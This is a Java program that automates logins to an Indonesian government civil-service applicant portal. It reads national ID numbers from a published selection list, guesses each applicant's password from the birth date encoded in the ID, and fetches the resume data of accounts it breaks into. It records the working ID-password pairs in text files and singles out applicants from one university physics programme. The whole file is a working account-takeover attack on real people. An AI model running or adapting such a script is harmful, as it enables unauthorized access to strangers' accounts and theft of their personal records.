package fjr.cpns.dikti;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

import fjr.com.utils.FileUtils;

public class CekLoginDikti {
	
	
	PrintWriter out  = null, out1 = null , out2 = null; 

	public CekLoginDikti() {
		HtmlPage page1 = null;
		WebClient webClient = new WebClient();
		webClient.getCookieManager().clearCookies();
		webClient.getOptions().setJavaScriptEnabled(false);
		webClient.getOptions().setCssEnabled(false);
		try {
			out = new PrintWriter(new FileOutputStream(  "./sukses login.txt" )); 
			out1 = new PrintWriter(new FileOutputStream(  "./log.txt" )); 
			out2 = new PrintWriter(new FileOutputStream(  "./all-sukses1.txt" )); 

			File ff = new File( "E:/birokrasi/lamaran kerja/CPNS 2019/kemendikbud - dikti/hasil seleksi administrasi.txt"  ); 
			String content = FileUtils.getFileString(ff); 
			Pattern p = Pattern.compile("[0-9]{17}"); 
			Matcher m = p.matcher(content); 
			int banyak = 0; 
			while(m.find()) {
				StringBuilder builder = new StringBuilder(m.group()) ;
				String nik = builder.reverse().substring(0, 16); 
				out1.println(nik);
				out1.flush();
				page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
				String old_tanggal = convertNikWanita(nik, false); 
				
				HtmlForm form = (HtmlForm) page1.getElementById("FormLogin"); 
				HtmlInput name = form.getInputByName("username"); 

				name.setValueAttribute(nik); 
				HtmlInput passwordForm = form.getInputByName("password"); 
				passwordForm.setValueAttribute(old_tanggal); 
				HtmlButton button = (HtmlButton) page1.getElementById("btnSimpan"); 
				HtmlPage page2 = button.click();
				String result = page2.asText(); 
				if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
						! result.toLowerCase().contains("bad credential") ) {
					Page json = webClient.getPage("https://sscndaftar.bkn.go.id/resume/resume.json");
					String jsonContent = json.getWebResponse().getContentAsString();
					if(jsonContent.contains("UNIVERSITAS TADULAKO PROGRAM STUDI S-1 FISIKA")) {
						out.println(nik + "|" + old_tanggal);  
						out.flush();
					}
					out2.println(nik + "|" + old_tanggal);
					out2.flush();
					continue; 
				}

				old_tanggal = convertNikWanita(nik, true); 
				page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
				
				form = (HtmlForm) page1.getElementById("FormLogin"); 
				name = form.getInputByName("username"); 

				name.setValueAttribute(nik); 
				passwordForm = form.getInputByName("password"); 
				passwordForm.setValueAttribute(old_tanggal); 
				button = (HtmlButton) page1.getElementById("btnSimpan"); 
				page2 = button.click();
				result = page2.asText(); 
				if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
						! result.toLowerCase().contains("bad credential") 
						) {
					Page json = webClient.getPage("https://sscndaftar.bkn.go.id/resume/resume.json");
					String jsonContent = json.getWebResponse().getContentAsString();
					if(jsonContent.contains("UNIVERSITAS TADULAKO PROGRAM STUDI S-1 FISIKA") ) {
						out.println(nik + "|" + old_tanggal);  
						out.flush();
					}
					out2.println(nik + "|" + old_tanggal);
					out2.flush();
					continue; 
				}					

			}
			System.out.println(banyak); 
			
		}catch(Exception e) {
			e.printStackTrace();
		}finally {
			if(out != null) {
				out.close(); 
			}
			if(out1!= null) {
				out1.close();
			}
			if(out2!=null) {
				out2.close();
			}

		}
	}
	
	
	
	public String convertNikWanita(String nik , boolean includeYearPrefix) {
		String nik_ = nik.substring(6,12); 
		int tgl_ktp = Integer.valueOf(nik_.substring(0,2)); 
		if( tgl_ktp > 40) {
			tgl_ktp  = tgl_ktp - 40 ;
		}
		String tgl_ktp_str = Integer.toString(tgl_ktp);
		if(tgl_ktp_str.length() == 1) {
			tgl_ktp_str = "0".concat(tgl_ktp_str);
		}
		String bulan_ktp_str = nik_.substring(2,4); 
		String tahun_ktp_str = nik_.substring(4,6)  ;
		if( includeYearPrefix) {
			tahun_ktp_str = "19".concat( tahun_ktp_str ) ;
		}
		String tgl_final = tgl_ktp_str.concat( bulan_ktp_str ).concat( tahun_ktp_str );
		return tgl_final; 
	}

	
	
	public static void main(String[] args) {
		new CekLoginDikti();
	}
	

}
